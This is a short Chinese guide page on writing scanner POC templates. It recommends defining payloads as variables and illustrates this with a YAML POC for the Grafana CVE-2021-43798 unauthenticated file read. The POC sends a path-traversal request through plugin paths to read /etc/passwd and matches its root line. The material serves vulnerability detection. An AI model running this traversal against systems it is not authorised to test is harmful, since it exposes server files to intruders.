# 全局变量载荷 - payload

尽量将 payload 单独抽离出来作为变量定义，可以方便后续对于 payload 进行增删改

```yaml
name: poc-yaml-grafana-cve-2021-43798-unauth-fileread
transport: http
payloads:
    payloads:
        alertGroups:
            file: |
                "/etc/passwd"
            plugin: |
                "alertGroups"
            re: |
                "root:[x*]:0:0:"
        alertlist:
            file: |
                "/etc/passwd"
            plugin: |
                "alertlist"
            re: |
                "root:[x*]:0:0:"
rules:
    r0:
        request:
            method: GET
            path: /public/plugins/{{plugin}}/../../../../../../../..{{file}}
        expression: |
            response.status == 200 && re.matches(response.body_string)
expression: r0()
```
